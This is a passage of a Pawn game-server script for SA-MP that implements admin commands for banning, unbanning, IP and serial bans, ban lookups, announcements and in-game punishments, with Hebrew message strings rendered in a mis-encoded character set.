		if(fexist(string)) return SendClientMessage(playerid,red," .ёщ°щрь цф ыс° ЁюЎр ссря");
		fcreate(string);
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && equal(GetSerial(i),cmd) && CommandAllowed(playerid,i,cmdtext)) Kick(i);
		format(string,sizeof(string)," UID Banned: %s",cmd);
		SendClientMessage(playerid,red,string);
	    return 1;
	}
	if(equal(cmd,"/unbanuid") && IsPlayerMAdmin(playerid))
	{
	    if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .19 Єьщъ ьфщх· ьЇчх· с°ю· рующя");
	    new string[M_S];
	    cmd = strtok(cmdtext,idx);
	    if(!strlen(cmd)) return SendClientMessage(playerid,white," /unbanuid [serial] :Ўх°· ф∙щюх∙");
	    format(string,sizeof(string),"%s%s.ban",folder_banuid,cmd);
	    if(!fexist(string)) return SendClientMessage(playerid,red," .ёщ°щрь цф ьр ЁюЎр ссря");
        fremove(string);
        format(string,sizeof(string)," UID Un Banned: %s",cmd);
        SendClientMessage(playerid,red,string);
	    return 1;
	}
	if(equal(cmd,"/ban") && IsPlayerMAdmin(playerid))
	{
		new id, reason[256], string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /ban [id/name] [reason] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /banreasons :ф∙·ю∙ сЇўхуф фсрф ь°∙щю· ёщсх· юўхЎ°х·");
			return 1;
		}
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(!playerinfo[id][acwarns] && playerinfo[playerid][admin] < 3 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 3");
		reason = strrest(cmdtext,idx);
		if(!strlen(reason)) reason = ".фрующя ьр фўьщу ёщсф";
		if(strlen(reason) <= 2)
		{
			new first[2];
			first[0] = reason[0];
			if(strlen(reason) == 2) first[1] = reason[1];
			for(new i = 0; i < sizeof(BanReasons); i++) if(equal(first,BanReasons[i][0]))
			{
				format(reason,sizeof(reason),BanReasons[i][1]);
				SendClientMessage(id,red,BanReasons[i][2]);
				break;
			}
		}
		format(string,sizeof(string),"(%d)%s %s banned (%d)%s %s [reason: %s]",playerid,GetIP(playerid),GetName(playerid),id,GetIP(id),GetName(id),reason);
		Log("Bans",playerid,string);
		print(string);
		SetBan(id,playerid,reason);
		return 1;
	}
	if(equal(cmd,"/unban") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 3");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /unban [name] :Ўх°· ф∙щюх∙");
		if(!fexist(fuserban(cmd))) return SendClientMessage(playerid,red," .ф∙чўя фЁсч° ьр ссря");
		if(fkeyexist(fuserban(cmd),"Level"))
		{
			new lvl = fgetint(fuserban(cmd),"Level");
			if(!equal(GetName(playerid),fgetstring(fuserban(cmd),"AdminName")) && playerinfo[playerid][admin] < 15) return SendClientMessage(playerid,red,".срЁщэ ∙р·ф ьр Ё·· °ў рующя °юф 15+ щыхь ьфх°щу");
			if(playerinfo[playerid][admin] < lvl)
			{
				format(string,sizeof(string)," .рщя ьъ тщ∙ф ьфх°щу р· фсря фцф, ф°юф ∙ьх фщр %d",lvl);
				return SendClientMessage(playerid,red,string);
			}
		}
		format(string,sizeof(string),"/DM/Bans/IP/%s.ini",fgetstring(fuserban(cmd),"PlayerIP"));
		if(fexist(string)) fremove(string);
		fremove(fuserban(cmd));
		format(string,sizeof(string)," *** %s has been unbanned by %s.",cmd,GetName(playerid));
		SendClientMessageToAll(red,string);
		format(string,sizeof(string),"(%d)%s %s unbanned \"%s\"",playerid,GetIP(playerid),GetName(playerid),cmd);
		Log("Bans",playerid,string);
		return 1;
	}
	if(equal(cmd,"/nban") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 3");
		new id, reason[256], string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /nban [id/name] [reason] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(fkeyexist(file_nbans,GetName(id))) return SendClientMessage(playerid,red," .фыщЁхщ фцф ыс° ссря");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(fkeyexist(file_admins,cmd) && fgetint(file_admins,cmd) >= playerinfo[playerid][admin]) return SendClientMessage(playerid,red," .∙э ю∙·ю∙ цф ∙щщъ ьрующя с°юф тсхфф ююъ хьыя ьр ·хыь ьсЎЄ р· фЇЄхьф фцх");
		reason = strrest(cmdtext,idx);
		if(!strlen(reason)) reason = ".фрующя ьр фўьщу ёщсф";
		format(string,sizeof(string)," *** %s has been name banned by %s. (%s)",GetName(id),GetName(playerid),reason);
		SendClientMessageToAll(red,string);
		fileCheck(file_nbans);
		format(string,sizeof(string),"%s|%s",GetName(playerid),reason);
		fsetstring(file_nbans,GetName(id),string);
		Kick(id);
		return 1;
	}
	if(equal(cmd,"/unnban") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 3");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /unnban [name] :Ўх°· ф∙щюх∙");
		fileCheck(file_nbans);
		if(!fkeyexist(file_nbans,cmd)) return SendClientMessage(playerid,red," .фыщЁхщ фцф ьр ссря");
		format(string,sizeof(string)," *** %s has been name unbanned by %s.",cmd,GetName(playerid));
		SendClientMessageToAll(red,string);
		fremovekey(file_nbans,cmd);
		return 1;
	}
	if((equal(cmd,"/ann") || equal(cmd,"/announce")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 3");
		new string[M_S];
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /announce(ann) [text] :Ўх°· ф∙щюх∙");
		if(charcount(cmd,'~') % 2 != 0) return SendClientMessage(playerid,red," !!!ьр °∙ю· р· фшўёш Ёыхя. ∙щэ ьс: рэ ·шЄф сшўёш ф∙°· Єьхь ьў°хё");
		format(string,sizeof(string),"~p~%s~h~:~n~~w~%s",GetName(playerid),cmd);
		GameTextForAll(string,5000,5);
		return 1;
	}
	if((equal(cmd,"/ann2") || equal(cmd,"/announce2")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 3");
		new string[M_S], text[256], st = 0;
		cmd = strtok(cmdtext,idx), text = strrest(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd) || !strlen(text)) return SendClientMessage(playerid,white," /announce2(ann2) [style] [text] :Ўх°· ф∙щюх∙");
		if(charcount(cmd,'~') % 2 != 0) return SendClientMessage(playerid,red," !!!ьр °∙ю· р· фшўёш Ёыхя. ∙щэ ьс: рэ ·шЄф сшўёш ф∙°· Єьхь ьў°хё");
		st = strval(cmd);
		if((st < 0 || st > 6 || st == 2) && !playerinfo[playerid][pp]) return SendClientMessage(playerid,red," .рщщущ ёшщщь ∙тхщ");
		format(string,sizeof(string),"~w~%s",GetName(playerid),cmd);
		GameTextForAll(string,5000,st);
		return 1;
	}
	if(equal(cmd,"/banipinfo") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))))
	{
		//if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID && !PlayerHasRank(playerid,RankID("Ўхх· ·ющыф"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		cmd = strtok(cmdtext,idx);
		new string[M_S], f[64];
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /banipinfo [ip] :Ўх°· ф∙щюх∙");
		format(f,sizeof(f),fuserbanIP(cmd));
		if(!fexist(f)) return SendClientMessage(playerid,red," .фрщщЇщ фЁсч° ьр ссря");
		format(string,sizeof(string)," ~~~ :%s - Ї°шщ сря ~~~",cmd);
		SendClientMessage(playerid,lightblue,string);
		SendClientMessage(playerid,grey," :фёщсф ьсря фщр");
		SendClientMessage(playerid,white,fgetstring(f,"Reason"));
		if(fkeyexist(f,"PlayerName"))
		{
			format(string,sizeof(string)," %s" @c(grey) " :∙э ф∙чўя",fgetstring(f,"PlayerName"));
			SendClientMessage(playerid,white,string);
		}
		if(fkeyexist(f,"AdminName"))
		{
			format(string,sizeof(string)," %s" @c(grey) " :фрующя ∙Ё·я р· фсря",fgetstring(f,"AdminName"));
			SendClientMessage(playerid,white,string);
		}
		if(fkeyexist(f,"PlayerIP"))
		{
			format(string,sizeof(string)," ы·хс· рщщЇщ ∙ь фсря: " @c(white) "%s",fgetstring(f,"PlayerIP"));
			SendClientMessage(playerid,grey,string);
		}
		if(fkeyexist(f,"Year") && fkeyexist(f,"Month") && fkeyexist(f,"Day"))
		{
			format(string,sizeof(string)," ·р°щъ: " @c(white) "%d.%d.%d",fgetint(f,"Day"),fgetint(f,"Month"),fgetint(f,"Year"));
			SendClientMessage(playerid,grey,string);
		}
		if(fkeyexist(f,"Hour") && fkeyexist(f,"Minute"))
		{
			format(string,sizeof(string)," ∙Єф: " @c(white) "%d:%d",fgetint(f,"Hour"),fgetint(f,"Minute"));
			SendClientMessage(playerid,grey,string);
		}
		if(fkeyexist(f,"S"))
		{
			format(string,sizeof(string)," юЎс фсря: " @c(white) "%s",equal(fgetstring(f,"S"),"Yes") ? ("юхё·°") : ("°тщь"));
			SendClientMessage(playerid,grey,string);
		}
		if(fkeyexist(f,"Days"))
			if(!fgetint(f,"Days")) SendClientMessage(playerid,grey," юёЇ° щющэ: " @c(white) "ьЎющ·х·");
			else
			{
				new daysToUnban = DaysBetweenDates(GetDateAsString(),GetDateFromINI(f));
				if(!daysToUnban) format(string,sizeof(string)," (юёЇ° щющэ: " @c(white) "%d (ЁюЎр ссря ыс° щхэ рчу",fgetint(f,"Days"),daysToUnban);
				else format(string,sizeof(string)," (юёЇ° щющэ: " @c(white) "%d (ЁюЎр ссря ыс° %d щющэ",fgetint(f,"Days"),daysToUnban);
				SendClientMessage(playerid,grey,string);
			}
		if(fkeyexist(f,"Level"))
		{
			format(string,sizeof(string)," °ю· фсря: " @c(white) "%d",fgetint(f,"Level"));
			SendClientMessage(playerid,grey,string);
		}
		return 1;
	}
	if(equal(cmd,"/baninfo") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		cmd = strtok(cmdtext,idx);
		new string[M_S], f[64], bt = 0, btname[64];
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /baninfo [name/ip] :Ўх°· ф∙щюх∙");
		lookingfortheban:
		{
			switch(bt)
			{
				case 0:
				{
					format(f,sizeof(f),fuserban(cmd));
					format(btname,sizeof(btname),"/DM/Bans/IP/%s.ini",fgetstring(f,"PlayerIP"));
					btname = fexist(btname) ? ("сря ьрщщЇщ хьыщЁхщ") : ("сря ьыщЁхщ");
				}
				case 1:
				{
					format(f,sizeof(f),"/DM/Bans/IP/%s.ini",cmd);
					format(btname,sizeof(btname),"/DM/Bans/%s.ini",fgetstring(f,"PlayerName"));
					btname = fexist(btname) ? ("сря ьрщщЇщ хьыщЁхщ") : ("сря ьрщщЇщ");
				}
				case 2:
				{
					format(f,sizeof(f),"/DM/Bans/Serials/%s.ini",cmd);
					btname = "сря ьы·хс· фюч∙с";
				}
			}
		}
		if(fexist(f))
		{
			format(string,sizeof(string)," ~~~ :%s - %s ~~~",cmd,btname);
			SendClientMessage(playerid,lightblue,string);
			if(fkeyexist(f,"PlayerName"))
			{
				format(string,sizeof(string)," %s" @c(grey) " :ыщЁхщ ф∙чўя фюх∙Єф",fgetstring(f,"PlayerName"));
				SendClientMessage(playerid,white,string);
			}
			if(fkeyexist(f,"PlayerIP"))
			{
				format(string,sizeof(string)," %s" @c(grey) " :ы·хс· фрщщЇщ ∙ь ф∙чўя фюх∙Єф",fgetstring(f,"PlayerIP"));
				SendClientMessage(playerid,white,string);
			}
			SendClientMessage(playerid,grey," :фёщсф ьсря фщр");
			SendClientMessage(playerid,white,fgetstring(f,"Reason"));
			if(fkeyexist(f,"AdminName"))
			{
				format(string,sizeof(string)," %s" @c(grey) " :фрующя ∙Ё·я р· фсря",fgetstring(f,"AdminName"));
				SendClientMessage(playerid,white,string);
			}
			if(fkeyexist(f,"Year") && fkeyexist(f,"Month") && fkeyexist(f,"Day"))
			{
				format(string,sizeof(string)," ·р°щъ щЎщ°· фсря: " @c(white) "%d.%d.%d",fgetint(f,"Day"),fgetint(f,"Month"),fgetint(f,"Year"));
				SendClientMessage(playerid,grey,string);
			}
			if(fkeyexist(f,"Hour") && fkeyexist(f,"Minute"))
			{
				format(string,sizeof(string)," ∙Є· щЎщ°· фсря: " @c(white) "%02d:%02d",fgetint(f,"Hour"),fgetint(f,"Minute"));
				SendClientMessage(playerid,grey,string);
			}
			if(fkeyexist(f,"S"))
			{
				format(string,sizeof(string)," юЎс фсря: " @c(white) "%s",equal(fgetstring(f,"S"),"Yes") ? ("юхё·°") : ("°тщь"));
				SendClientMessage(playerid,grey,string);
			}
			if(fkeyexist(f,"Days"))
				if(!fgetint(f,"Days")) SendClientMessage(playerid,grey," юёЇ° щющэ: " @c(white) "ьЎющ·х·");
				else
				{
					new daysToUnban = DaysBetweenDates(GetDateAsString(),GetDateFromINI(f));
					if(!daysToUnban) format(string,sizeof(string)," (юёЇ° щющэ: " @c(white) "%d (ЁюЎр ссря ыс° щхэ рчу",fgetint(f,"Days"),daysToUnban);
					else format(string,sizeof(string)," (юёЇ° щющэ: " @c(white) "%d (ЁюЎр ссря ыс° %d щющэ",fgetint(f,"Days"),daysToUnban);
					SendClientMessage(playerid,grey,string);
				}
			if(fkeyexist(f,"Level"))
			{
				format(string,sizeof(string)," °ю· фсря: " @c(white) "%d",fgetint(f,"Level"));
				SendClientMessage(playerid,grey,string);
			}
		}
		else
		{
			if(bt < 2)
			{
				bt++;
				goto lookingfortheban;
			}
			else return SendClientMessage(playerid,red," .ьр ЁюЎр сря ·хрэ ьыщЁхщ рх ы·хс· фрщщЇщ ∙фўьу·");
		}
		return 1;
	}
	if(equal(cmd,"/banip") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 3");
		new string[M_S], reason[M_S], t[6];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /banip [ip] [reason] :Ўх°· ф∙щюх∙");
		format(string,sizeof(string),"/DM/Bans/IP/%s.ini",cmd);
		if(fexist(string)) return SendClientMessage(playerid,red," .фрщщЇщ фЁсч° ыс° ссря");
		if(charcount(cmd,'.') != 3 || strlen(cmd) < 8 || strlen(cmd) > 15 || strcount(cmd,"255") > 1) return SendClientMessage(playerid,red," .фрщщЇщ ∙фхўьу ьр ·ўщя");
		reason = strrest(cmdtext,idx);
		if(!strlen(reason)) reason = ".фрующя ьр фўьщу ёщсф";
		fcreate(string);
		fsetstring(string,"PlayerName","Unknown-IPBan");
		fsetstring(string,"AdminIP",GetIP(playerid));
		fsetstring(string,"AdminName",GetName(playerid));
		fsetstring(string,"Reason",reason);
		getdate(t[0],t[1],t[2]);
		gettime(t[3],t[4],t[5]);
		fsetint(string,"Year",t[0]);
		fsetint(string,"Month",t[1]);
		fsetint(string,"Day",t[2]);
		fsetint(string,"Hour",t[3]);
		fsetint(string,"Minute",t[4]);
		fsetstring(string,"S","No");
		fsetint(string,"Days",0);
		fsetint(string,"Level",playerinfo[playerid][admin]);
		format(string,sizeof(string)," :∙ьъ юф∙°·, юфёщсф IP-ф∙Єф р· ы·хс· ф %s фрующя",GetName(playerid));
		for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && equal(GetIP(i),cmd) && CommandAllowed(playerid,i,cmdtext))
		{
			SendClientMessage(i,red,string);
			SendClientMessage(i,red,reason);
			Kick(i);
		}
		format(string,sizeof(string),"%s :IP-ф∙Єф юф∙°· р· ы·хс· ф",cmd);
		AdminInfo(playerid,string);
		format(string,sizeof(string),"[Reason: %s]",reason);
		AdminInfo(playerid,string);
		format(string,sizeof(string),"(%d)%s %s ip banned \"%s\"",playerid,GetIP(playerid),GetName(playerid),cmd);
		Log("Bans",playerid,string);
		return 1;
	}
	if(equal(cmd,"/unbanip") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 3");
		new string[M_S], n[MAX_PLAYER_NAME];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /unbanip [ip] :Ўх°· ф∙щюх∙");
		if(charcount(cmd,'.') != 3 || strlen(cmd) < 8 || strlen(cmd) > 15 || strcount(cmd,"255") > 1) return SendClientMessage(playerid,red," .фрщщЇщ ∙фхўьу ьр ·ўщя");
		format(string,sizeof(string),"/DM/Bans/IP/%s.ini",cmd);
		if(!fexist(string)) return SendClientMessage(playerid,red," .фрщщЇщ фЁсч° ьр ссря");
		if(fkeyexist(string,"Level"))
		{
			new lvl = fgetint(string,"Level");
			if(playerinfo[playerid][admin] < lvl)
			{
				format(string,sizeof(string)," .рщя ьъ тщ∙ф ьфх°щу р· фсря фцф, ф°юф ∙ьх фщр %d",lvl);
				return SendClientMessage(playerid,red,string);
			}
		}
		format(n,sizeof(n),fgetstring(string,"PlayerName"));
		format(string,sizeof(string),"/DM/Bans/%s.ini",n);
		if(fexist(string)) fremove(string);
		format(string,sizeof(string),"/DM/Bans/IP/%s.ini",cmd);
		fremove(string);
		format(string,sizeof(string)," *** %s has been unbanned by %s.",n,GetName(playerid));
		SendClientMessageToAll(red,string);
		format(string,sizeof(string),"(%d)%s %s ip unbanned \"%s\"",playerid,GetIP(playerid),GetName(playerid),n);
		Log("Bans",playerid,string);
		return 1;
	}
	if(equal(cmd,"/rbanip") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new string[M_S], id;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /rbanip [id/name/ip] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp]))
		{
			id = -1;
			for(new i=0,l=strlen(cmd);i<l;i++) if((cmd[i] < '0' || cmd[i] > '9') && cmd[i] != '.') return SendClientMessage(playerid,red," .ы·хс· фрщщЇщ ∙фўьу· юыщьф ·хщэ ьр чхўщщэ ьрщщЇщ");
			if(strlen(cmd) < 7 || strlen(cmd) > 15) return SendClientMessage(playerid,red," .рщщЇщ ўЎ° рх р°хъ юущ");
		}
		if(id == -1)
		{
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && equal(GetIP(i),cmd)) if(!CommandAllowed(playerid,i,cmdtext)) return 1;
			format(string,sizeof(string)," .фрщщЇщ ∙фўьу· (%s) ўщсь сря",cmd);
			SendClientMessage(playerid,red,string);
			format(string,sizeof(string),"banip %s",cmd);
		}
		else
		{
			if(!CommandAllowed(playerid,id,cmdtext)) return 1;
			format(string,sizeof(string)," .ўщсь сря рщщЇщ %s",GetName(id));
			SendClientMessage(playerid,red,string);
			format(string,sizeof(string),"banip %s",GetIP(id));
		}
		SendRconCommand(string);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/runbanip") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /runbanip [ip] :Ўх°· ф∙щюх∙");
		for(new i=0,l=strlen(cmd);i<l;i++) if((cmd[i] < '0' || cmd[i] > '9') && cmd[i] != '.') return SendClientMessage(playerid,red," .ы·хс· фрщщЇщ ∙фўьу· юыщьф ·хщэ ьр чхўщщэ ьрщщЇщ");
		if(strlen(cmd) < 7 || strlen(cmd) > 15) return SendClientMessage(playerid,red," .рщщЇщ ўЎ° рх р°хъ юущ");
		format(string,sizeof(string)," .ьрщщЇщ ∙фўьу· (%s) щщ°у фсря",cmd);
		SendClientMessage(playerid,red,string);
		format(string,sizeof(string),"unbanip %s",cmd);
		SendRconCommand(string);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/banreasons") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 3");
		new list[512];
		for(new i = 0; i < sizeof(BanReasons); i++) format(list,sizeof(list),!strlen(list) ? (@c(yellow)"%s Х %d. %s = \"%s\"") : ("%s\r\n Х %d. %s = \"%s\""),list,i+1,BanReasons[i][0],BanReasons[i][1]);
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "°∙щю· ёщсх· юўхЎ°х· ьсрЁщэ",list,"OK","");
		return 1;
	}
	if((equal(cmd,"/explode") || equal(cmd,"/xp")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 3");
		new id, string[M_S], Float:p[3];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /explode(xp) [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		GetPlayerPos(id,p[0],p[1],p[2]);
		CreateExplosion(p[0],p[1],p[2],7,50);
		format(string,sizeof(string)," *** %s has been exploded by %s.",GetName(id),GetName(playerid));
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i)) SendClientMessage(i,white,string);
  		return 1;
	}
	if((equal(cmd,"/pexplode") || equal(cmd,"/pxp")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 3");
		new id, string[M_S], Float:p[3];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /pexplode(pxp) [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		GetPlayerPos(id,p[0],p[1],p[2]);
		CreateExplosionForPlayer(id,p[0],p[1],p[2],7,50);
		format(string,sizeof(string)," *** %s has been (p)exploded by %s.",GetName(id),GetName(playerid));
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i)) SendClientMessage(i,white,string);
  		return 1;
	}
	if(equal(cmd,"/burn") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 3");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /burn [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		SetPlayerBurn(id);
		format(string,sizeof(string)," *** %s has been burned by %s.",GetName(id),GetName(playerid));
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i)) SendClientMessage(i,white,string);
		return 1;
	}
	if(equal(cmd,"/userban") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 3");
		new string[M_S], id = INVALID_PLAYER_ID, reason[M_S], f[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /userban [name] [reason] :Ўх°· ф∙щюх∙");
		reason = strrest(cmdtext,idx);
		if(!strlen(reason)) reason = ".фрующя ьр фўьщу ёщсф";
		format(f,sizeof(f),"/DM/Users/%s.ini",cmd);
		if(!fexist(f)) return SendClientMessage(playerid,red," .∙э ю∙·ю∙ ьр ўщщэ");
		if(fkeyexist(file_admins,cmd) && fgetint(file_admins,cmd) >= playerinfo[playerid][admin]) return SendClientMessage(playerid,red," .∙э ю∙·ю∙ цф ∙щщъ ьрующя с°юф тсхфф ююъ хьыя ьр ·хыь ьсЎЄ р· фЇЄхьф фцх");
		if(!equal(fgetstring(f,"Ban"),"No")) return SendClientMessage(playerid,red," .фю∙·ю∙ ыс° сЁЄщьф");
		for(new i=0;i<MAX_PLAYERS_;i++) if(equal(GetName(i),cmd))
		{
			id = i;
			if(!CommandAllowed(playerid,id,cmdtext)) return 1;
			playerinfo[i][banned] = 1;
			break;
		}
		format(string,sizeof(string),"%s|%s",GetName(playerid),reason);
		fsetstring(f,"Ban",string);
		format(string,sizeof(string)," *** User %s has been locked by %s. (%s)",cmd,GetName(playerid),reason);
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		if(IsPlayerConnected(id)) Kick(id);
		format(string,sizeof(string),"(%d)%s %s user banned %s [reason: %s]",playerid,GetIP(playerid),GetName(playerid),cmd,reason);
		Log("Bans",playerid,string);
		return 1;
	}
	if(equal(cmd,"/unuserban") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 3");
		new string[M_S], id = INVALID_PLAYER_ID;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /unuserban [name] :Ўх°· ф∙щюх∙");
		format(string,sizeof(string),"/DM/Users/%s.ini",cmd);
		if(!fexist(string)) return SendClientMessage(playerid,red," .∙э ю∙·ю∙ ьр ўщщэ");
		if(equal(fgetstring(string,"Ban"),"No")) return SendClientMessage(playerid,red," .фю∙·ю∙ ьр сЁЄщьф");
		fsetstring(string,"Ban","No");
		format(string,sizeof(string)," *** User %s has been unlocked by %s.",cmd,GetName(playerid));
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		format(string,sizeof(string),"(%d)%s %s user unbanned %s [reason: %s]",playerid,GetIP(playerid),GetName(playerid),id,cmd);
		Log("Bans",playerid,string);
		return 1;
	}
	if(equal(cmd,"/userbaninfo") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 3 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 3");
		new string[M_S], banadmin[M_S], banreas[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /userbaninfo [name] :Ўх°· ф∙щюх∙");
		format(string,sizeof(string),"/DM/Users/%s.ini",cmd);
		if(!fexist(string)) return SendClientMessage(playerid,red," .∙э ю∙·ю∙ ьр ўщщэ");
		if(!equal(fgetstring(string,"Ban"),"No")) return SendClientMessage(playerid,red," .фю∙·ю∙ ьр сЁЄщьф");
		SetString(banadmin,fgetstring(fuser(playerid),"Ban"));
		SetString(banreas,banadmin);
		strdel(banadmin,strfind(banadmin,"|"),strlen(banadmin) - 1);
		strdel(banreas,0,strfind(banreas,"|"));
		format(string,sizeof(string)," :юфёщсф %s ўщщю· ЁЄщь· ю∙·ю∙ Єь щущ фрующя",banadmin);
